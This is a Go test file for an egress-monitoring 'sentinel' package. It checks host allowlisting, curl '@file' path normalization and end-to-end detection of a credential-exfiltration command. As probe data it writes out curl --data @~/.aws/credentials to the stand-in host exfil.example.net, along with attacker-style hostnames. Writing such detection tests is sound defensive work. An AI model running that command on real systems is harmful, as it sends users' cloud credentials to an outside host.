// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestIsAllowlisted_GoproxyPrefixClosed: the removed unanchored "goproxy."
// host-prefix wildcard must no longer fail-open the egress leg for an
// attacker-registrable host, while the legitimate compiled defaults are intact.
func TestIsAllowlisted_GoproxyPrefixClosed(t *testing.T) {
	v := newVocabulary(nil, nil)

	assert.False(t, v.isAllowlisted("goproxy.attacker.com"),
		"an attacker-registrable host beginning with 'goproxy.' must NOT be allowlisted")
	assert.False(t, v.isAllowlisted("goproxy.evil.example.com"))

	// Legitimate compiled-default hosts are unaffected, including the real public
	// GOPROXY mirrors now matched by exact host (not by the removed prefix).
	assert.True(t, v.isAllowlisted("proxy.golang.org"))
	assert.True(t, v.isAllowlisted("registry.npmjs.org"))
	assert.True(t, v.isAllowlisted("sub.npmjs.org"), "suffix wildcard still holds")
	assert.True(t, v.isAllowlisted("goproxy.cn"), "real public GOPROXY mirror stays allowlisted (exact match)")
	assert.True(t, v.isAllowlisted("goproxy.io"))

	// A site-specific GOPROXY mirror is reachable only when the operator adds its
	// exact host via egress_allowlist (ADD-ONLY, exact match) — never by prefix.
	v2 := newVocabulary(nil, []string{"goproxy.mycorp.example"})
	assert.True(t, v2.isAllowlisted("goproxy.mycorp.example"))
	assert.False(t, v2.isAllowlisted("goproxy.mycorp.example.attacker.com"))
}

// TestNormalize_StripsCurlAtFileSigil: curl reads a file for -d/--data via the
// "@file" syntax; the '@' must be stripped so the underlying sensitive path is
// visible to the matcher (previously '@~/.aws/credentials' mis-joined onto cwd
// and hid the exfil).
func TestNormalize_StripsCurlAtFileSigil(t *testing.T) {
	v := newVocabulary(nil, nil)
	require.NotEmpty(t, v.home, "test requires a resolvable home dir")

	credsToken := "@" + filepath.Join(v.home, ".aws", "credentials")
	cat, ok := v.matchSensitive([]string{"--data-binary", credsToken})
	assert.True(t, ok, "curl --data-binary @<home>/.aws/credentials must classify as a sensitive read")
	assert.Equal(t, "aws-credentials", cat)
}

// TestEngine_CurlAtFileExfilDetected: the confirmed single-command exfil —
// `curl --data @<home>/.aws/credentials https://<non-allowlisted>/` — must fire
// the self-contained legEgress rule end-to-end (it silently went undetected
// before the @-sigil normalization fix).
func TestEngine_CurlAtFileExfilDetected(t *testing.T) {
	v := newVocabulary(nil, nil)
	require.NotEmpty(t, v.home, "test requires a resolvable home dir")

	fires, err := replayCount(Config{}, []probeEvent{
		{"curl", []string{
			"--data", "@" + filepath.Join(v.home, ".aws", "credentials"),
			"https://exfil.example.net/u",
		}},
	})
	require.NoError(t, err)
	assert.Equal(t, 1, fires,
		"single-command curl --data @<home>/.aws/credentials to a non-allowlisted host must fire exactly once")
}

// TestSelfTestWith_LiveVacuousConfigFails: SelfTestWith replays the LIVE config,
// so an egress allowlist broad enough to swallow the canned exfil host makes the
// positive probe silent and the self-test fail — the doctor's non-vacuity proof
// now covers the running configuration, not just the compiled defaults.
func TestSelfTestWith_LiveVacuousConfigFails(t *testing.T) {
	// A suffix that covers exfil.example.net but is not a bare-TLD wildcard, so it
	// is not rejected at config-load and can reach the engine.
	err := SelfTestWith(context.Background(), Config{ExtraAllowlist: []string{"*.example.net"}})
	assert.Error(t, err, "a live allowlist that swallows the exfil probe host must fail the self-test")
}
